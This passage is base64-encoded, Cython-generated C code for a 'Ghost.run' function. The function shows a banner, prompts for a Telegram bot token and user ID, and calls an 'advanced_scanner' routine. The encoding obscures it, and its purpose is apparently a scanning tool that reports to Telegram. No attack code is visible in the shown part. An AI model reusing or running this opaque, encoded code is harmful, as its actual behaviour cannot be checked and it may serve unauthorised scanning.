3B5eF9rd3ZhbHVlczsKICBQeU9iamVjdCogdmFsdWVzWzFdID0gezB9OwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInJ1biAod3JhcHBlcikiLCAwKTsKICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpOwogICNlbHNlCiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX1NpemUoX19weXhfYXJncyk7IGlmICh1bmxpa2VseShfX3B5eF9uYXJncyA8IDApKSByZXR1cm4gTlVMTDsKICAjZW5kaWYKICAjZW5kaWYKICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTsKICB7CiAgICBQeU9iamVjdCAqKiBjb25zdCBfX3B5eF9weWFyZ25hbWVzW10gPSB7Jl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZWxmLDB9OwogICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7CiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDQ2OSwgX19weXhfTDNfZXJyb3IpCiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7CiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHsKICAgICAgICBjYXNlICAxOgogICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCA0NjksIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICBjYXNlICAwOiBicmVhazsKICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgICB9CiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7CiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJydW4iLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ2OSwgX19weXhfTDNfZXJyb3IpCiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAxOyBpKyspIHsKICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlc1tpXSkpIHsgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoInJ1biIsIDEsIDEsIDEsIGkpOyBfX1BZWF9FUlIoMCwgNDY5LCBfX3B5eF9MM19lcnJvcikgfQogICAgICB9CiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzICE9IDEpKSB7CiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7CiAgICB9IGVsc2UgewogICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7CiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDQ2OSwgX19weXhfTDNfZXJyb3IpCiAgICB9CiAgICBfX3B5eF92X3NlbGYgPSB2YWx1ZXNbMF07CiAgfQogIGdvdG8gX19weXhfTDZfc2tpcDsKICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7CiAgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoInJ1biIsIDEsIDEsIDEsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDQ2OSwgX19weXhfTDNfZXJyb3IpCiAgX19weXhfTDZfc2tpcDo7CiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTsKICBfX3B5eF9MM19lcnJvcjo7CiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9BZGRUcmFjZWJhY2soInRmLkdob3N0LnJ1biIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBOVUxMOwogIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjsKICBfX3B5eF9yID0gX19weXhfcGZfMnRmXzVHaG9zdF8zMHJ1bihfX3B5eF9zZWxmLCBfX3B5eF92X3NlbGYpOwoKICAKICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7CiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7CiAgfQogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0Zl81R2hvc3RfMzBydW4oQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZikgewogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3ZfZSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7CiAgc2l6ZV90IF9fcHl4X3RfMzsKICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF82ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDsKICBpbnQgX19weXhfdF84OwogIFB5T2JqZWN0ICpfX3B5eF90XzkgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEwID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xMSA9IE5VTEw7CiAgaW50IF9fcHl4X3RfMTI7CiAgaW50IF9fcHl4X3RfMTM7CiAgY2hhciBjb25zdCAqX19weXhfdF8xNDsKICBQeU9iamVjdCAqX19weXhfdF8xNSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTYgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzE3ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xOCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTkgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzIwID0gTlVMTDsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJydW4iLCAwKTsKCiAgCiAgX19weXhfdF8yID0gX19weXhfdl9zZWxmOwogIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIpOwogIF9fcHl4X3RfMyA9IDA7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgTlVMTH07CiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY3JlYXRlX2Jhbm5lciwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8zLCAoMS1fX3B5eF90XzMpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA0NzAsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwoKICAKICBfX3B5eF90XzIgPSBOVUxMOwogIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX2lucHV0KTsKICBfX3B5eF90XzQgPSBfX3B5eF9idWlsdGluX2lucHV0OyAKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0NzEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUkVTRVQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0NzEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0NzEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogIF9fcHl4X3RfNiA9IF9fUHl4X1B5VW5pY29kZV9Db25jYXQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9Cb3RfVG9rZW4sIF9fcHl4X3RfNSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQ3MSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgX19weXhfdF8zID0gMTsKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBfX3B5eF90XzZ9OwogICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgyLV9fcHl4X3RfMykgfCAoX19weXhfdF8zKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDQ3MSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICB9CiAgaWYgKF9fUHl4X1B5T2JqZWN0X1NldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdG9rZW4sIF9fcHl4X3RfMSkgPCAoMCkpIF9fUFlYX0VSUigwLCA0NzEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwoKICAKICBfX3B5eF90XzQgPSBOVUxMOwogIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX2lucHV0KTsKICBfX3B5eF90XzYgPSBfX3B5eF9idWlsdGluX2lucHV0OyAKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0NzIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUkVTRVQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0NzIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0NzIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogIF9fcHl4X3RfNSA9IF9fUHl4X1B5VW5pY29kZV9Db25jYXQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9UZWxlZ3JhbV9JRCwgX19weXhfdF8yKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDcyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBfX3B5eF90XzMgPSAxOwogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X3RfNX07CiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDItX19weXhfdF8zKSB8IChfX3B5eF90XzMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNDcyLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIH0KICBpZiAoX19QeXhfUHlPYmplY3RfU2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91c2VyX2lkLCBfX3B5eF90XzEpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDcyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKCiAgCiAgX19weXhfdF82ID0gTlVMTDsKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDc0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5c3RlbSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQ3NCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQ3NCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9uYW1lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDc0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBfX3B5eF90XzggPSAoX19QeXhfUHlVbmljb2RlX0VxdWFscyhfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9udCwgUHlfRVEpKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzggPCAwKSkpIF9fUFlYX0VSUigwLCA0NzQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogIGlmIChfX3B5eF90XzgpIHsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2xzKTsKICAgIF9fcHl4X3RfNSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbHM7CiAgfSBlbHNlIHsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2xlYXIpOwogICAgX19weXhfdF81ID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsZWFyOwogIH0KICBfX3B5eF90XzMgPSAxOwogICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF80KSkpIHsKICAgIF9fcHl4X3RfNiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNCk7CiAgICBhc3NlcnQoX19weXhfdF82KTsKICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF80KTsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpOwogICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNCwgX19weXhfX2Z1bmN0aW9uKTsKICAgIF9fcHl4X3RfMyA9IDA7CiAgfQogICNlbmRpZgogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzYsIF9fcHl4X3RfNX07CiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDItX19weXhfdF8zKSB8IChfX3B5eF90XzMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNDc0LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIH0KICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKCiAgCiAgX19weXhfdF80ID0gX19weXhfdl9zZWxmOwogIF9fUHl4X0lOQ1JFRihfX3B5eF90XzQpOwogIF9fcHl4X3RfMyA9IDA7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNCwgTlVMTH07CiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGxsLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgxLV9fcHl4X3RfMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDQ3NiwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CgogIAogIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfOSwgJl9fcHl4X3RfMTAsICZfX3B5eF90XzExKTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF85KTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMCk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTEpOwogICAgIHsKCiAgICAgIAogICAgICBfX3B5eF90XzQgPSBfX3B5eF92X3NlbGY7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzQpOwogICAgICBfX3B5eF90XzMgPSAwOwogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNCwgTlVMTH07CiAgICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FkdmFuY2VkX3NjYW5uZXIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDEtX19weXhfdF8zKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA0NzksIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgICB9CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwoKICAgICAgCiAgICB9CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgZ290byBfX3B5eF9MOF90cnlfZW5kOwogICAgX19weXhfTDNfZXJyb3I6OwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwoKICAgIAogICAgX19weXhfdF8xMiA9IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoKChQeU9iamVjdCAqKSgoKFB5VHlwZU9iamVjdCopUHlFeGNfRXhjZXB0aW9uKSkpKTsKICAgIGlmIChfX3B5eF90XzEyKSB7CiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygidGYuR2hvc3QucnVuIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMSwgJl9fcHl4X3RfNCwgJl9fcHl4X3RfNSkgPCAwKSBfX1BZWF9FUlIoMCwgNDgwLCBfX3B5eF9MNV9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzQpOwogICAgICBfX3B5eF92X2UgPSBfX3B5eF90XzQ7CiAgICAgICB7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfNyA9IE5VTEw7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogICAgICAgIF9fcHl4X3RfMiA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogICAgICAgIF9fcHl4X3RfMyA9IDE7CiAgICAgICAgewogICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV99OwogICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8yLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgyLV9fcHl4X3RfMykgfCAoX19weXhfdF8zKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0ODEsIF9fcHl4X0wxNF9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICAgIH0KICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgfQoKICAgICAgCiAgICAgICB7CiAgIC